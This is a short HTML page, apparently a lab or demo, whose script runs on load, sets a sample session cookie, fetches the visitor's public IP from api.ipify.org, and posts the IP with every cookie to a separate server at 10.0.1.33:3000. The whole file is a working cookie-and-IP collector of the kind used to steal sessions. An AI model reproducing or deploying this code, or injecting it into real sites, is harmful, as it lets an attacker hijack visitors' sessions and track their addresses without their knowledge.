<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send Cookies and IP</title>
  <script>
    // Function to set a cookie
    function setCookie(name, value, days) {
      let expires = "";
      if (days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
      }
      document.cookie = name + "=" + (value || "") + expires + "; path=/";
    }

    // Function to send data (IP and cookies) to server
    async function sendDataToServer() {
      try {
        // Fetch user IP using a public IP API
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        // Collect all cookies
        const cookies = document.cookie;

        // Send cookies and IP to the server
        await fetch("http://10.0.1.33:3000", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            ip: userIP,
            cookies: cookies
          })
        });

        console.log("IP and cookies sent successfully!");
      } catch (error) {
        console.error("Error sending data to server:", error);
      }
    }

    // Set a sample cookie and send data on page load
    window.onload = () => {
      setCookie("session_id", "12345", 1); // Set a sample cookie valid for 1 day
      sendDataToServer();
    };
  </script>
</head>
<body>
  <h1>Cookie and IP Sender</h1>
  <p>Data will be sent to the server automatically when this page loads.</p>
</body>
</html>
